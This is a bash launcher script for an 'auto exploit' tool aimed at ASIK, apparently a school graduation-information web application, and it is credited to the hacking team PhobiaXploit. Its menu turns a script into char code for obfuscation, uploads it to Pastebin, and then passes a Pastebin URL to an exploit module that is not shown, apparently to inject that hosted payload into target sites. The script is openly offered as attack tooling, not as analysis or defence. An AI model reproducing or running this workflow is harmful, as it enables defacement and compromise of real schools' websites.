#!/bin/bash

clear

f=3 b=4s
for j in f b; do
  for i in {0..7}; do
    printf -v $j$i %b "\e[${!j}${i}m"
  done
done

banner(){
echo "${f3}
 ______   ________ ___  ____/\  ______   _______
       \ |    ___/  __|    /  \       \    ____/
|   -   ||___    \|   ||   ___/|   -   ||   _/\ 
|   |   ||       /|   ||     \ |   |   ||   /  \,
|___|   ||__ ___/ |   ||      \|___|   ||_   __/
    |___|         |___||___\  /    |___|   \/   
                            \/ 
${f6}APLIKASI SISTEM INFORMASI KELULUSAN AUTO EXPLOIT
${f1}Author  : ${f7} Dominic404 - Rijone01
${f1}Team    : ${f7} PhobiaXploit
${f1}Contact : ${f7} phobiaxploit@gmail.com
"
}

main(){
banner
echo "${f6}[${f3} ASIK - AE LIST ${f6}]"
echo "${f6}[${f3}1${f6}]${f7} Create Script / Convert To Char Code"
echo "${f6}[${f3}2${f6}]${f7} Upload Script To Pastebin"
echo "${f6}[${f3}3${f6}]${f7} Exploit ASIK"
read -p "Option > " opt;

if [[ $opt == "1" ]]; then
php module/convert.php
fi
if [[ $opt == "2" ]]; then
php module/pastebin.php
fi
if [[ $opt == "3" ]]; then
echo "Ex: https://pastebin.com/WXRPkwic";	
read -p "Your Script : " sc;
chmod +x module/jso.sh
./module/jso.sh $sc
fi 
}

main
